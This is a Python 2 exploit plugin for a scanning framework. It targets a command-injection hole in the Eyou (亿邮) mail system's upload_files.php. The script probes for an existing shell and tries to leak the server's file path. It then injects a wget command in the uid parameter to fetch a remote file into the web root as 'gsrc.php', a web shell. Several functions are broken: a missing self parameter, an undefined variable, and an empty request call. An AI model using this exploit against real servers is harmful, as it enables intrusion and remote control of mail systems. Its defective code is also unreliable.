#coding=utf-8
'''
Demo modules for ass_hole_hunter
Reprouct from mst
'''
from libs.functions import *
#import modules.*
from path_scan import  hunter_plugin


class hunter_exploit:
    '''discuz'''
    infos = {
        'plugin_name':'eyou(亿邮)邮件系统getshell其一',
        'author':'demon',
        'update':'2015/10/21',
        'site':'http://www.dawner.info',
        'vuln_type':'cmd_exec',
        'vuln_source':'http://www.cnseay.com/4011/comment-page-1/'
        }
    opts  = {
        'url':'192.168.1.254 or default',
        }


    def __init__(self,url):
        self.url = url

    def exploit(self):
        '''start exploit'''
#预检测shell部分
        shell_url = self.url+'/gsrc.php'
        c0de = url_get(shell_url).getcode()
        if c0de == 200:
            return "[+]Shell:"+shell_url
        real_path,relate_path = self.path_get()
        m = re.search(r'\\',real_path)
        if m:
            relate_path = relate_path.replace("/", "\\")
        real_path = real_path.replace(relate_path,"")
        touch_url = self.url+"/swfupload/upload_files.php?uid=|wget+http://www.test.com/test.txt+-O+"+real_path+"/gsrc.php&domain="
        touch = url_get(touch_url).read()
        c0de = url_get(shell_url).getcode()
        if c0de == 200:
            print '[!]Eyou with a cmd_exec at url.\n'
            print '[+]Shell_url:'+shell_url+'\n'
            return "[+]Shell:"+shell_url
        else:
            print "[!]Getshell failed!"
            pass

    def path_get():
        if  self.url.count(':') == 2:
            port = int(re.search(r':\d+\/',self.url).group(0)[1:-1])
        elif "https" in self.url:
            port = 443 
        else:
            port = 80

        site_path = urlparse.urlparse(self.url).path+"/"
        attack = hunter_plugin(site_url,"eyou",port,site_path)
        paths = attack.exploit()
        try:
            for path in paths:
                path_url = self.url+"/"+path
                path_resp = url_get().read()
###########################################################################################
#匹配路径部分
                try:
                    pre_match = re.search(r'\/.*?php',path_resp).group(0)
                    match = re.search(r'\/.*\/',path_resp).group(0)
                except:
                    try:
                        pre_match = re.search(r'\w:\\.*?php',path_resp.lower()).group(0)
                        match = re.search(r'\w:\\.*\\',path_resp).group(0)
                    except Exception,e:
                        print e
                        #ymatch = re.search(r"\'\/.*?\'",path_resp).group(0)

                if match:
                    return match,path
                else:
                    pass

                #match = re.search(r'\/.*\/',path_resp).group(0)
        except Exception,e:
            exit(0)
###########################################################################################
